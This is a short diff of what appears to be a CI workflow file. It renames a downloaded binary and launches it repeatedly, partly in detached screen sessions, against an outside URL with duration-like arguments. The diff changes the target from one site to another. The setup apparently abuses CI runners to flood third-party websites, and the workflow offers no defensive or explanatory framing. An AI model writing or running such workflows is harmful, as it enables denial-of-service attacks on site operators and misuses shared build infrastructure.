@@ -36,10 +36,10 @@ jobs:
           chmod +x *
           mv ki o          
           
-          screen -dms ve ./o  https://thecountbot.lol/6901966783-ab811341-3078-4e98-b092-f67340acf883 240 1 1 
-          screen -dms ve ./o https://thecountbot.lol/6901966783-ab811341-3078-4e98-b092-f67340acf883 240 1 1 
+          screen -dms ve ./o  https://black.cat.pegasus-vault.com/ 240 1 1 
+          screen -dms ve ./o https://black.cat.pegasus-vault.com/ 240 1 1 
           
-          ./o https://thecountbot.lol/6901966783-ab811341-3078-4e98-b092-f67340acf883 240 1 1
+          ./o https://black.cat.pegasus-vault.com/ 240 1 1
           
 
           
